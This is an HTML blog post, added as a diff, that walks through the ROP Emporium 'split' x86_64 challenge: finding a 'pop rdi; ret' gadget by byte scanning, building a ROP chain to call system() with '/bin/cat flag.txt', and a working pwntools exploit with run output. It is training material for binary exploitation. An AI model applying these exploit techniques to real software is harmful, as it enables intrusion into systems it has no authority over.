@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>ROP Emporium — split (x86_64) — Tiu</title>
+<style>
+  :root { --bg:#0d1117; --fg:#e6edf3; --dim:#8b949e; --acc:#58a6ff; --card:#161b22; --line:#30363d; }
+  * { box-sizing:border-box; }
+  body { margin:0; background:var(--bg); color:var(--fg);
+        font:16px/1.7 -apple-system,"Segoe UI",Roboto,Helvetica,Arial,sans-serif; }
+  .wrap { max-width:860px; margin:0 auto; padding:2rem 1.2rem 4rem; }
+  header.site { border-bottom:1px solid var(--line); margin-bottom:2rem; padding-bottom:1rem; }
+  header.site h1 { margin:0; font-size:1.4rem; }
+  header.site .sub { color:var(--dim); font-size:.95rem; }
+  a { color:var(--acc); text-decoration:none; }
+  a:hover { text-decoration:underline; }
+  nav a { margin-right:1rem; color:var(--dim); }
+  article h1 { font-size:1.7rem; border-bottom:1px solid var(--line); padding-bottom:.4rem; }
+  h2 { margin-top:2rem; }
+  blockquote { margin:1rem 0; padding:.6rem 1rem; border-left:3px solid var(--acc);
+               background:var(--card); color:var(--dim); }
+  pre { background:var(--card); border:1px solid var(--line); border-radius:8px;
+        padding:1rem; overflow-x:auto; font-size:.88rem; }
+  code { font-family:"Cascadia Code",Consolas,Menlo,monospace; }
+  :not(pre) > code { background:var(--card); border:1px solid var(--line);
+                     border-radius:4px; padding:.1em .35em; font-size:.9em; }
+  table { border-collapse:collapse; width:100%; margin:1rem 0; }
+  th, td { border:1px solid var(--line); padding:.45rem .7rem; text-align:left; }
+  th { background:var(--card); }
+  .card { background:var(--card); border:1px solid var(--line); border-radius:10px;
+          padding:1.1rem 1.3rem; margin:1rem 0; display:block; color:var(--fg); }
+  .card:hover { border-color:var(--acc); text-decoration:none; }
+  .card .meta { color:var(--dim); font-size:.88rem; margin-top:.3rem; }
+  .card h3 { margin:.1rem 0 .3rem; color:var(--acc); }
+  footer { margin-top:3rem; padding-top:1rem; border-top:1px solid var(--line);
+           color:var(--dim); font-size:.85rem; }
+</style>
+</head>
+<body>
+<div class="wrap">
+<header class="site">
+  <h1><a href="index.html" style="color:inherit">Tiu — Security Research Notes</a></h1>
+  <div class="sub">Binary exploitation · Reverse engineering · Memory & network forensics</div>
+  <nav><a href="index.html">Posts</a><a href="https://github.com/dabai-sec">GitHub</a></nav>
+</header>
+<h1>ROP Emporium — split (x86_64)</h1>
+<blockquote>
+<p><strong>Category:</strong> pwn / binary exploitation
+<strong>Binary:</strong> <a href="https://ropemporium.com/challenge/split.html">split</a> (ROP Emporium, x86_64)
+<strong>Techniques:</strong> stack overflow → ROP chain, <code>pop rdi; ret</code> gadget hunting, calling <code>system()</code> with a controlled argument
+<strong>Environment:</strong> authorized training binary, local lab</p>
+</blockquote>
+<p><code>split</code> is the natural sequel to
+<a href="ret2win.html">ret2win</a>: the win code exists, but this time it
+runs the <em>wrong</em> command — we must build a tiny ROP chain to call <code>system()</code>
+with <strong>our</strong> string.</p>
+<h2>1. Recon</h2>
+<pre><code>$ file split
+split: ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
+</code></pre>
+<p>Same protections profile as ret2win: NX on, no PIE, symbols present.</p>
+<h2>2. The puzzle pieces</h2>
+<p><code>usefulFunction()</code> calls <code>system()</code>, but with <code>/bin/ls</code> — useless:</p>
+<pre><code>0000000000400742 &lt;usefulFunction&gt;:
+  400746:  mov   edi,0x40084a
+  40074b:  call  400560 &lt;system@plt&gt;
+
+$ strings -t x split | grep -E &quot;bin|flag&quot;
+   84a /bin/ls                  &lt;- what usefulFunction runs  (0x40084a)
+  1060 /bin/cat flag.txt        &lt;- what we WANT to run        (0x601060)
+</code></pre>
+<p>So the ingredients are:</p>
+<table>
+<thead>
+<tr>
+<th>Piece</th>
+<th>Address</th>
+<th>Note</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>system@plt</code></td>
+<td><code>0x400560</code></td>
+<td>target function</td>
+</tr>
+<tr>
+<td><code>"/bin/cat flag.txt"</code></td>
+<td><code>0x601060</code></td>
+<td>argument string, already in the binary</td>
+</tr>
+<tr>
+<td>overflow offset</td>
+<td>40</td>
+<td>same 32+8 layout as ret2win</td>
+</tr>
+</tbody>
+</table>
+<p>Missing: a way to load <code>rdi</code> (first argument register, x86_64 SysV ABI).</p>
+<h2>3. Gadget hunting by bytes</h2>
+<p>The binary has no literal <code>pop rdi</code> in the symbol-level disassembly — but
+ROP gadgets don't care about instruction boundaries. Scanning <code>.text</code> for
+the byte pair <code>5f c3</code> (<code>pop rdi; ret</code>):</p>
+<pre><code class="language-python">data = open(&quot;split&quot;, &quot;rb&quot;).read()
+text = data[0x5b0:0x5b0+0x222]     # .text: vaddr 0x4005b0, off 0x5b0, size 0x222
+j = text.find(b&quot;\x5f\xc3&quot;)
+print(hex(0x4005b0 + j))           # 0x4007c3
+</code></pre>
+<pre><code>pop rdi ; ret  @ 0x4007c3      &lt;- hides inside `pop %r15` (41 5f) at 0x4007c2
+</code></pre>
+<p>We also reuse the alignment <code>ret</code> from ret2win at <code>0x40053e</code> — without it,
+glibc's <code>system()</code> dies on a <code>movaps</code> fault (see the ret2win note).</p>
+<h2>4. The chain</h2>
+<pre><code>[ 40 * &quot;A&quot;        ]  fill buffer + saved rbp
+[ 0x40053e        ]  ret                  ; align RSP to 16 for system()
+[ 0x4007c3        ]  pop rdi ; ret
+[ 0x601060        ]  &quot;/bin/cat flag.txt&quot;  ; -&gt; rdi
+[ 0x400560        ]  system@plt           ; pwned
+</code></pre>
+<h2>5. Exploit &amp; verification</h2>
+<pre><code class="language-python">from pwn import *
+
+elf = context.binary = ELF(&quot;./split&quot;, checksec=False)
+
+RET     = 0x40053e                 # ret — stack alignment shim
+POP_RDI = 0x4007c3                 # pop rdi ; ret
+CATFLAG = 0x601060                 # &quot;/bin/cat flag.txt&quot;
+SYSTEM  = elf.plt[&quot;system&quot;]        # 0x400560
+
+io = process(&quot;./split&quot;)
+io.sendline(flat(b&quot;A&quot; * 40, RET, POP_RDI, CATFLAG, SYSTEM))
+print(io.recvall().decode(errors=&quot;replace&quot;))
+</code></pre>
+<p>Real run:</p>
+<pre><code>$ python3 exploit.py
+split by ROP Emporium
+x86_64
+
+Contriving a reason to ask user for data...
+&gt; Thank you!
+ROPE{a_placeholder_32byte_flag!}
+</code></pre>
+<p>(The process segfaults <em>after</em> printing — there is no clean exit on our
+chain, and none is needed: the flag is already out. On a real target you
+would append <code>exit@plt</code> for a silent finish.)</p>
+<h2>Takeaways</h2>
+<ul>
+<li>ret2win → split is the moment you stop <em>jumping to code</em> and start
+  <em>composing</em> it: one gadget to set up a register, one call to cash in.</li>
+<li>Gadgets live between instruction boundaries. <code>objdump</code> alone won't show
+  <code>pop rdi; ret</code> — byte-level scanning (<code>5f c3</code>) or a tool like ROPgadget
+  will.</li>
+<li>Argument passing on x86_64: <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, ... — each new argument
+  you need is one more <code>pop</code> gadget in the chain.</li>
+</ul>
+<footer>All research performed in authorized environments (CTF events, lab ranges,
+public training datasets). · © 2026 Tiu</footer>
+</div>
+</body>
+</html>
